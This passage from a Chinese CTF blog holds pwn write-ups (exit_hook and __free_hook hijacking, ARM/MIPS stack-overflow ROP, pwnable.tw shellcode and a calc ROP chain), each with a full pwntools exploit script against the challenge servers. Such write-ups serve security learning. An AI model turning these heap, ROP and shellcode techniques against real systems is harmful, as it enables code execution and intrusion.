(\u0026(GL(dl_load_lock)).mutex)**。 我们在gdb中查看一下_rtld_local这个结构究竟是什么东西。（gdb中输入p _rtld_local） 我们可以看到_rtld_local这个结构体的dl_rtld_unlock_recursive成员其实就是一个函数指针，其指向了rtld_lock_default_unlock_recursive这个函数，并且由于该函数是libc里面的函数，我们只需要修改其3个字节就可以篡改为我们的onegadget。 Ok，总结一下exit的调用过程：exit==\u003edl_fini==\u003e_rtld_local.dl_rtld_unlock_recursive #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() if args['REMOTE']: sh=remote(\"axb.d0g3.cn\",20103) else: sh=process(\"./sfs\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def debug(command=''): #context.terminal = ['tmux', 'splitw', '-h'] gdb.attach(sh,command) def exp(): #debug(\"b*0x7ffff77f4364\\nc\") libc=ELF(\"./libc-2.23.so\") json=\"{\\\"name\\\": \\\"aaaa\\\",\\\"passwd\\\": \\\"aaa\\\"}\" sl(json) ru(\"error!\\nlogger:\") libc_base=u64(ru(\" \").replace(\" \",\"\\x00\").ljust(8,\"\\x00\"))-0x3c4b78 info_addr(\"libc_base\",libc_base) one_gadget=0xf0364+libc_base exit_hook=libc_base+0x8f9f48 info_addr(\"one_gadget\",one_gadget) for i in range(3): s(p64(exit_hook+i)) s(chr(one_gadget\u00260xff)) one_gadget=one_gadget\u003e\u003e8 #debug() itr() exp() ","date":"2020-11-26","objectID":"/%E5%AE%89%E6%81%92%E6%9D%AF-wp/:1:0","tags":["pwn","wp"],"title":"安恒杯--WP","uri":"/%E5%AE%89%E6%81%92%E6%9D%AF-wp/"},{"categories":["ctf"],"content":"IO_FILE UAF漏洞，程序没有开启PIE和REALO，并且libc是2.27的版本，漏洞很好利用，唯一的一个难点是unsorted bin堆块中记录的libc地址和IO_stdout结构体之间相差太多，暴力解比较困难，这里需要转换一下思路。 由于题目没有开启PIE，因此我们知道got表的地址，而got表中有stdout指针，其记录了IO_stdout结构体的地址，因此我们可以利用UAF，修改堆块fd为stdout got表地址，这样就可以间接获得IO_stdou结构的地址，而无需爆破。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() if args['REMOTE']: sh=remote(\"axb.d0g3.cn\",20102) else: sh=process(\"./IO_FILE\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def debug(command=''): #context.terminal = ['tmux', 'splitw', '-h'] gdb.attach(sh,command) def choice(elect): ru('\u003e') sl(str(elect).encode()) def add(size,content): choice(1) ru(':') sl(str(size).encode()) ru(\":\") s(content) def delete(index): choice(2) ru(':') sl(str(index).encode()) def exp(): libc=ELF(\"./libc.so.6\") add(0x90,\"0\") add(0x80,\"1\") for i in range(4): delete(0) add(0x90,p64(0x602080)) add(0x90,\"a\") add(0x90,\"\\x60\") add(0x90,p64(0xfbad1800)+p64(0)*3+\"\\x00\") ru(\"\\xe3\") libc_base=u64((\"\\xe3\"+r(5)).ljust(8,\"\\x00\"))-131-libc.symbols[\"_IO_2_1_stdout_\"] system=libc_base+libc.symbols[\"system\"] free_hook=libc_base+libc.symbols[\"__free_hook\"] info_addr(\"libc_base\",libc_base) info_addr(\"system\",system) info_addr(\"free_hook\",free_hook) for i in range(3): delete(1) add(0x80,p64(free_hook)) add(0x80,\"a\") add(0x80,p64(system)) add(0x10,\"/bin/sh\\x00\") delete(9) itr() exp() ","date":"2020-11-26","objectID":"/%E5%AE%89%E6%81%92%E6%9D%AF-wp/:2:0","tags":["pwn","wp"],"title":"安恒杯--WP","uri":"/%E5%AE%89%E6%81%92%E6%9D%AF-wp/"},{"categories":["ctf"],"content":"参考 exit_hook劫持 ","date":"2020-11-26","objectID":"/%E5%AE%89%E6%81%92%E6%9D%AF-wp/:3:0","tags":["pwn","wp"],"title":"安恒杯--WP","uri":"/%E5%AE%89%E6%81%92%E6%9D%AF-wp/"},{"categories":["ctf"],"content":"雨下整夜，我的爱溢出就像雨水。 ——《七里香》周杰伦 之前做的pwn题都是基于x86架构的ELF文件题目，这一次参加TSCTF，有一大半的题目是非x86架构的题目，不得不现学相关知识，用这篇博客来总结一下在题目中学到的东西。 ps：题目的相关二进制文件和EXP放在了github上。 ARM ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:0:0","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"环境搭建 我们利用qemu来启动arm程序。qemu是一种虚拟化模拟器，在user mode其能模拟不同架构的CPU，并运行为这些不同架构CPU编译的Linux文件，比如我们这里将要启动的ARM文件。 安装qemu sudo apt-get install qemu-user 安装qemu后，我们就可以启动静态链接的ARM程序了，如果是动态链接的ARM程序，那么我们还需要指出其动态链接库储存的位置，如果题目没有给出文件的动态链接库，需要自己下载。 下载动态链接库 #首先搜索一下有哪些动态链接库 apt search \"libc6-\" | grep \"arm\" #然后在搜索结果中选择一个形似libc6-arm-cross的库安装即可 sudo apt-get install libc6-arm64-cross 接下来我们就可以启动动态链接的arm程序了 启动程序 #静态链接 qemu-arm ./arm-file #动态链接，题目没有给出链接文件，自行下载 qemu-arm -L /usr/aarch64-linux-gnu/lib ./arm-file #动态链接，题目给出链接文件 qemu-arm -L ./lib ./arm-file ok，现在程序已经可以启动起来了，最后还需要做的就是用gdb来调试程序，这里需要用到的是gdb-multiarch，该gdb可以attach到不同架构的文件上。 安装gdb-multiarch sudo apt-get install git gdb gdb-multiarch 之后我们在qemu-arm中开启一个端口，然后用gdb-multiarch去链接即可调试arm程序 利用gdb-multiarch调试arm程序 #qemu开启端口 qemu-arm -g 123 -L /usr/aarch64-linux-gnu/lib ./arm-file #gdb-multiarch启动后 \u003e\u003etarget remote localhost:123 #这里也可以写一个gdb脚本，用-comand来运行 gdb-multiarch -command=gdb.sh ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:1:0","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"寄存器，指令知识 ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:2:0","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"寄存器 ARM处理器一共有7种工作模式 USR模式：正常用户模式，程序正常执行 FIQ模式（Fast Interrupt Request）：处理快速中断，支持高速数据传送或通道处理 IRQ模式：处理普通中断 SVC模式（Supervisor）：操作系统保护模式，处理软件中断swi reset ABT中止（Abort mode）：处理存储器故障，实现虚拟储存器和存储器保护 UND未定义（Undefined）：处理未定义的指令陷阱，支持硬件协处理器的软件仿真 SYS系统模式：运行特权操作系统任务，基本等于USR 每种工作模式下用到的寄存器都会有所不同，其总共拥有31个通用寄存器 R0~R15 R13_irq，R14_irq R13_svc，R14_svc R13_abt，R14_abt R13_und，R14_und R8_fiq~R14_fiq 和6个状态寄存器 CPSR SPSR_fiq SPSR_irq SPSR_svc SPSR_abt SPSR_und 每个状态下用到的通用寄存器和状态寄存器汇总如下： system\u0026user FIRQ Supervisor Abort IRQ Undefined R0 R0 R0 R0 R0 R0 R1 R1 R1 R1 R1 R1 R2 R2 R2 R2 R2 R2 R3 R3 R3 R3 R3 R3 R4 R4 R4 R4 R4 R4 R5 R5 R5 R5 R5 R5 R6 R6 R6 R6 R6 R6 R7 R7 R7 R7 R7 R7 R8 R8_firq R8 R8 R8 R8 R9 R9_firq R9 R9 R9 R9 R10 R10_firq R10 R10 R10 R10 R11 R11_firq R11 R11 R11 R11 R12 R12_firq R12 R12 R12 R12 R13 R13_firq R13_svc R13_abt R13_irq R13_und R14 R14_firq R14_svc R14_abt R14_irq R14_und R15 R15 R15 R15 R15 R15 CPSR CPSR CPSR CPSR CPSR CPSR SPSR_firq SPSR_svc SPSR_abt SPSR_irq SPSR_und 现在我们已经知道了各个工作模式下，都会用到哪些寄存器，接下来需要解决的问题是这些寄存器都有什么作用？和x86寄存器有哪些相似的地方？这里需要先介绍一个标准叫APCS，全称ARM Procedure Call standard（ARM过程调用标准），其定义了各个寄存器在程序中的作用并给各个寄存器起了别名。 R0-R3用于向子程序传递参数，APCS的别名为a1-a4，其类似于x86的rdi，rsi，rdx，rcx。R0寄存器也用于函数返回值的传递，类似于rax。 R4-R9用于储存局部变量，APCS的别名为v1-v6 R10是栈限制，APCS的别名为sl R11是帧限制，APCS的别名为fp R12是内部过程调用寄存器，APCS的别名为ip R13是栈指针，APCS的别名为sp R14是连接寄存器，APCS的别名为lr R15是程序计数器，APCS的别名为pc 其中我们需要重点关注的是R0-R3，R13，R14，R15。R13和R15根据其别名能想到其功能，而R14的作用是保存返回地址，其对于理解ARM下的栈溢出有着关键作用。 ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:2:1","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"指令 这里只简单介绍一下ARM的指令结构和常用指令，更详细的信息请看参考中ARM指令集详解。 ARM的指令结构为：\u003copcode\u003e{\u003ccond\u003e}{S} \u003cRd\u003e,\u003cRn\u003e{,\u003coperand2\u003e} \u003c\u003e内的信息是必须的，{}内的项是可选的，如\u003copcode\u003e是指令助记符，是必须有的，而{\u003ccond\u003e}为指令执行条件，是可选的，一般不写默认是AL即无条件执行。 opcode：指令助记符 cond：执行条件 S：是否影响CPSR寄存器的值，有S时影响，没有时不影响 Rd：目标寄存器 Rn：第一个操作数的寄存器 operand2：第二个操作数 OK，知道了ARM指令的结构后，我们来介绍几个ARM特有并且常见的指令 LDR LDR指令用于从内存中读取数据放入寄存器中。 如：LDR R0,[R1] 即将R1寄存器储存的地址处的数据读入R0中 ​ LDR R0,[R1,#0x100] 即将R1+0x100地址处的数据读入R0中，不修改R1的值 ​ LDR R0,[R1],#0x100 即将R1+0x100地址处的数据读入R0中，并且修改R1为R1+100(这里出现了第二个操作数，加了一个#号即为立即数，并且结果会写回R1中，注意和上一条指令的区别) 与LDR相对于的还有一个LDP指令，其是从内存中读取连续的数据赋值给寄存器 如：LDP R0,R1,[SP,#0x100] 即将SP+0x100地址处的值，连续读入到R0和R1中，连续读入的意思是假设R0读取的是0xfff0地址处的值，R1读取0xfff8地址处的值(假设是64位)。 STR STR指令用于将数据储存在内存中。 如：STR R0,[R1] 即将数据R0储存在R1寄存器储存的地址处。 与STR相似的还有个指令是STP，其功能类似与LDP，其将多个寄存器的值，连续储存在内存中。 如：STP R0,R1,[SP,#0x100] 即将数据R0和R1连续储存在SP+0x100地址处，连续意思与上面类似。 BL BL是带链接的跳转指令，其会将下一条指令拷贝到R14中，然后跳转到指定地址处。 与之类似的还有B和BX，B是直接跳转，BX是带状态切换的跳转指令，跳转到Rm 指定的地址执行程序，若Rm 的位[0]为1，则跳转时自动将CPSR 中的标志T 置位，即把目标地址的代码解释为Thumb代码;若Rm 的位[0]为0，则跳转时自动将CPSR 中的标志T 复位，即把目标地址的代码解释为ARM代码。 ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:2:2","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"栈 ARM的栈结构和X86类似，R0-R3用于储存前四个参数，多余的参数会储存在栈中，在用户模式下会根据R14寄存器储存的值来返回，因此在函数开头和结尾常见的指令是： STP X29, X30, [SP,#-0x110]! LDP X29, X30, [SP],#0x110 ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:2:3","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"例题 这里就以TSCTF的helloARM作为例题来讲解。 IDA打开后很容易发现，有一个oooooo函数存在栈溢出漏洞，这里我们从其汇编代码来观察函数，顺便学习巩固一下ARM的指令。 第一条语句:STP X29，X30，[SP，#-0x110]！ X29相当于rbp，X30相当于返回地址，这句话的意思就是将rbp和返回地址，保存在sp-0x110处，叹号的意思是先修改寄存器再访问内存，相当于先计算sp=sp-0x110，再访问[sp]，所以执行这条语句后，SP寄存器也被修改了。不得不说ARM指令比起x86来说，简单了很多。 第二条语句:MOV X29,SP 将SP的值赋给X29，从后面观察发现，访问局部变量就都是通过X29来访问的了。 第三-七条语句 设置memset函数的三个参数，并用BL来跳转到memset函数处，根据前面的知识可得，BL会将下一条语句的地址赋值给R14，即这里的X30。 read函数处 根据X0的值我们知道其读取的地址是在rsp+0x10处，并且可以读入0x500的值，而分配给这个函数的零时变量只有0x100大小，所以存在溢出。(从第一句我们可以知道该函数的栈空间大小总共是0x110，但是最低的0x10直接数据留给了rbp和返回地址，所以变量就只有0x100)。 倒数第二句:LDP X29，X30，[SP]，#0x110 将第一句保存的rbp和返回地址的值赋值给X29和X30，相当于恢复环境 最后一句:RET 根据X30的值，来修改rip，相当于B X30，所以如果能修改X30的值就可以控制程序流。 根据上面的分析，我们发现我们可以溢出0x400的数据，但是X29是保存在低地址处的，也就是说没有办法修改oooooo函数保存的X29的值，那么我们就去修改main函数在栈地址上保存的值，观察main函数会发现，其X29也是保存在栈的低地址处的，所以只需要溢出0x108字节就可以控制main函数的X29了。 OK，现在我们可以控制控制流了，只要再能控制R0-R2三个寄存器的话，就可以get shell了。 观察了下IDA，发现程序没有能直接控制R0-R2的gadget，不像x86有push和pop，不过我们可以像x86利用ret2libc_csu一样来利用arm的ret2libc_csu，这里就不详细介绍ret2libc_csu了，基本原理和x86一致，直接看EXP。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() if args['REMOTE']: sh=remote('10.104.255.210',7777) else: sh=process(['qemu-aarch64','-g','1234','-L','/usr/aarch64-linux-gnu/','./HelloARm']) #sh=process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu/','./HelloARm']) if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def debug(command=''): os.system('xfce4-terminal -x sh -c \"gdb-multiarch pwn -ex \\'target remote 127.0.0.1:1234\\'\"') def paper_rop(func,r0=0,r1=0,r2=0,buff=0): rop = p64(0x000000000411080) #x30 rop += p64(0x0000000000400AAC) rop += p64(0) rop += p64(1) #20 rop += p64(func) #x21=func rop += p64(r0) #x22=r0 rop += p64(r1) #x23=r1 rop += p64(r2) #x24=x2 return rop def exp(): libc=ELF(\"./lib/libc-2.27.so\") read=0x0000000000400760 write=0x0000000000400730 ru(\"number:\") buff=int(ru(\"\\n\").replace(\"\\n\",''),16)-0x10 info_addr(\"buff\",buff) ru(\"name\") sl(\"a\") ru(\"message\") payload=\"a\"*0x108+p64(0x000000000400AD4)+p64(read)+p64(write)+\\ \"a\"*0x100+paper_rop(func=buff,r0=3,r1=0x000000000411090,r2=0x100)+\\ p64(0)+p64(0x000000000400AD4)+p64(0)*6+paper_rop(func=buff+8,r0=1,r1=0x000000000411090,r2=0x100) print hex(len(payload)) sl(payload) itr() exp() MIPS ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:3:0","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"简介 MIPS是Microcomputer without interlocked pipeline stages的缩写，含义是无互锁流水级微处理器，其另一个含义是每秒百万条指令——Millions of instructions per second。其采用精简指令系统计算机构（RISC结构）设计，相比于x86/64的CISC结构，更为简单，设计周期更短。最关键的一点，MIPS架构的授权费用比较低。 ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:4:0","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"环境搭建 MIPS的环境搭建基本和ARM差不多，唯一的区别是在动态链接库搜索和qemu启动程序上面。 #动态链接库搜索 apt search \"libc6-\" | grep \"mips\" #qemu启动 qemu-mipsel -g 123 -L ./lib ./mips-file #注意qemu分小端和大端，mipsel是启动小端的程序 ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:5:0","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"寄存器，指令和栈结构知识 ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:6:0","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"寄存器 MIPS一共有32个寄存器，每个寄存器的功能和别名用下面的表格来展现。 编号 助记符号 含义 0 zero 永远为0 1 at 用于汇编器的暂时变量 2-3 v0,v1 子函数调用返回结果 4-7 a0-a3 子函数调用的参数 8-15（24-25） t0-t7(t8-t9) 暂时变量，子函数使用时不需要保存与恢复 s0-s7 子函数寄存器变量。在返回之前子函数必须保存和恢复使用过的变量，从而调用函数知道这些寄存器的值没有变化 26，27 k0,k1 通常被中断或异常处理处理程序使用作为保存一些系统参数 28 gp 全局指针，一些运行系统维护这个指针来更方便的存取static和extern变量。 29 sp 堆栈指针 30 s8/fp 第9个寄存器变量/子函数可作为帧指针用 31 ra 子函数返回地址 根据表格已经可以了解到大多数寄存器的作用，这里只取其中几个比较特别的寄存器来讲解一下。 $0(zero):该寄存器的值永远为0，不管你向其存放什么值，都会返回0。 $31(ra):存放函数的返回地址，一般在程序结尾，都会有一句jr $ra来实现程序返回，这与X86和ARM的返回方式有区别。 $28(gp):该寄存器会存放一个全局指针，它会指向运行时决定的静态数据区域，这样当需要对这些数据进行存取时，只需要一条指令就可以。 有一点需要注意的是，MIPS相比x86和ARM，是没有状态寄存器的。 ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:6:1","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"指令 MIPS的指令分成三种格式，R，I，J。 R格式 R格式(Register format)指令为纯寄存器指令，所有的操作数均保存在寄存器中（移位指令除外），其各个字段的含义如下： opcode rs rt rd shamt funct 31-26 25-21 20-16 15-11 10-6 5-0 操作符 源操作数寄存器1 源操作数寄存器2 目的操作数寄存器 位移量 操作符附加段 对于R格式的指令，其opcode都为零，由funct字段来区别不同的指令。 例如add和sub指令： 指令 opcode rs rt rd shamt funct add 00000 rs rt rd 00000 100000 sub 000000 rs rt rd 00000 100010 算数指令：add,addu,sub,subu,slt,sltu。其中u的意思是进行unsigned运算，slt指令的功能是rd=(rs\u003crt)?1:0，用来判断rs和rt寄存器值的大小。 逻辑指令：and,xor,or,nor 位移指令：sll,srl,sra,sllv,srlv,srav。有v的是由rs决定位移位数，没有的是由shamt决定。而有a的是保留符号位。 跳转指令：jr。该指令一般用在函数返回。 I格式 I格式(Immediate format)指令为带立即数的指令，最多能使用两个寄存器，其指令结构为： opcode rs rd im 31-26 25-21 20-16 15-0 操作符 源操作数寄存器 目的操作数寄存器 立即数 不同的指令有opcode来区分。 算术指令：addi,addiu,slti,sltiu。与R格式的指令基本一致，不过多了个i，其代表立即数。 逻辑指令：andi,ori,xori。 载入指令：li,lui,lw,sw。l代表load，从内存中加载数据到寄存器。s代表store，将寄存器的数值储存到内存中。 跳转指令：beq,bne。eq代表当两个寄存器的值相等时，才跳转。ne代表两个寄存器的值不相等时才跳转。 J格式 J格式(Jump format)为长跳转指令，仅有一个操作数，其指令结构为： opcode address 31-26 25-0 操作符 地址 注意这里的地址是伪直接地址，其最后的跳转地址是由pc的高四位和该地址右移两位得到，即PC=PC[29:31]+address«2。 其指令有：j，jal。jal会将下一条指令的地址赋值给$31即$ra，通常用于子程序的调用中。 ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:6:2","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"栈结构 MIPS的栈结构和x86是一样的，这里需要关注的是其如何保存返回地址和如何返回。 在函数开头通常会有sw $ra,0x1c($sp);这样的语句，它的作用就是保存返回地址到栈上。 函数结尾会有**lw $ra, 0x1c($sp);jr $ra;**这样的语句，它会将返回地址读入到ra中，并跳转。 ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:6:3","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"例题 这里以TSCTF HelloMIPS题目作为例题的讲解。 题目的漏洞出现在oooooo函数处，有一个栈溢出漏洞，我们通过阅读汇编代码，来巩固上面学到的指令。 第一，二条语句： li指令给$gp赋值，addu再使其指向所需要的全局变量处。 第三-六条语句： 给程序分配栈空间，栈空间大小为0x120，把返回地址，和调用函数的帧指针储存再栈地址高字节处，并将栈顶指针赋值给$fp。 memset处： 将栈空间0x18-0x118内的值赋为0，这里出现了$zero这个常为零的寄存器。 这里还有个细节需要注意，在每个跳转指令后面都跟着一个nop指令，这是因为MIPS在执行跳转指令时，会先执行下一条指令。 read处： 向栈空间0x18处读入0x500的地址，而栈空间总共才分配0x120大小的值，所以存在栈溢出。 剩余部分 恢复现场，将返回地址，保存的帧指针等都重新赋值给寄存器，而返回地址是保存在0x11c处的，而栈溢出可以修改此处的值，所以可以控制程序流。 题目还泄漏了libc的地址，因此我们可以到libc中找控制$a0-$a3的gadget，再调用system来获得shell。这些就不再讲解了，都是老ROP了，直接看EXP。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() if args['REMOTE']: sh=remote('10.104.255.211',7777) else: #sh=process(['qemu-mipsel','-g','123','-L','/mnt/hgfs/share/ctf/helloMIPS','./HelloMIPS']) sh=process(['qemu-mipsel','-L','/mnt/hgfs/share/ctf/helloMIPS','./HelloMIPS']) if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def exp(): name=0x00440E20 libc=ELF(\"./lib/libc.so.0\") ru(\"Hello\") sl(\"/bin/sh\") ru(\":\") system=int(ru(\"\\n\").replace(\"\\n\",''),16) libc_base=system-libc.symbols[\"system\"] secret=libc_base+0x00000000000F684 ucmain=0x0000000000400BC8 info_addr(\"system\",system) offset=0x104 payload=\"a\"*offset+p32(ucmain)+\\ \"a\"*0x18+p32(name)+p32(0)+p32(secret)+p32(0)+\"a\"*0x24+p32(0x00000000004008AC) sl(payload) itr() exp() 参考 Arm PWN学习笔记 ARM架构下的 Pwn 的一般解决思路 Qemu简述 GDB调试及其调试脚本的使用 arm架构寄存器介绍 ARM过程调用标准—APCS简单介绍 ARM指令集详解 MIPS 通用寄存器 + 指令 MIPS 寄存器使用约定 MIPS 指令集(共31条) MIPS指令集与简要分析 MIPS指令集及汇编 ","date":"2020-10-25","objectID":"/%E5%88%9D%E7%AA%A5arm-mips/:7:0","tags":["pwn","arm"],"title":"初窥ARM\u0026MIPS","uri":"/%E5%88%9D%E7%AA%A5arm-mips/"},{"categories":["ctf"],"content":"当你在穿山越岭的另一边，我在孤独的路上没有尽头。 ——《思念是一种病》 张震岳 ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:0:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"start 程序存在一个简单的栈溢出，并且没有开启NX保护，所以可以向栈中写shellcode。唯一的难点就是没有办法泄漏stack地址，但是可以利用程序的第一句push esp来达到不泄漏地址而执行shellcode的目的。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote('chall.pwnable.tw',10000) else: sh=process('./start') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def exp(): #debug(\"b*0x0804809C\\nc\") # shellcode=''' # mov ecx,esp # add ecx,0x100 # mov dl,0xff # mov al,3 # int 0x80 # jmp ecx # ''' payload=\"\\x00\"*0x14+p32(0x08048060)+asm(shellcraft.sh()) print hex(len(payload)) sa(\":\",payload) payload=\"\\x00\"*0x14+p32(0x0804809C) sa(\":\",payload) # sleep(3) # s(asm(shellcraft.sh())) itr() exp() ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:1:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"orw 开启了沙盒，考察orw的shellcode书写。 注：写shellcode的一些技巧，灵活利用push 和pop来修改寄存器的值，这样可以减少shellcode的大小，还可以利用push来在栈上布置字符串，然后利用esp来访问。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote('chall.pwnable.tw',10001) else: sh=process(\"./orw\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def exp(): #debug(\"b*0x0804858A\\nc\") shellcode=''' push 5 pop eax push 0x804a089 pop ebx push 0 pop ecx int 0x80 mov ebx,eax push 3 pop eax push 0x804a089 pop ecx push 0x100 pop edx int 0x80 push 4 pop eax push 1 pop ebx int 0x80 ''' payload=asm(shellcode)+b\"/home/orw/flag\\x00\" sla(\":\",payload) itr() exp() ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:2:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"calc(Fun) 在计算功能函数中，有一个数组的第一个元素用于储存输入表达式的读入数字数，而如果输入的第一个字符为+时，就可以篡改第一个元素，即修改读入数字的总数，进而可以实现任意地址修改，来实现ROP。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote('chall.pwnable.tw',10100) else: sh=process(\"./calc\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def modify_stack(addr_offset,value): payload=\"+\"+str(addr_offset)+\"-\"+str(value) ru(\"\\n\") sl(payload) def exp(): mprotect=0x806F1F0 read=0x806e6da bss=0x80EE000 payload=[mprotect,0x08049812,bss,0x1000,7,read,bss+0x300,0x8049c30,0x80EE300-0x8049c30] #debug(\"b*0x08049812\\nc\") length=len(payload)-1 while length\u003e=0: modify_stack(0x168+length,payload[length]) length-=1 sl(\"\") sleep(2) shellcode=asm(shellcraft.sh()) sl(shellcode) itr() exp() 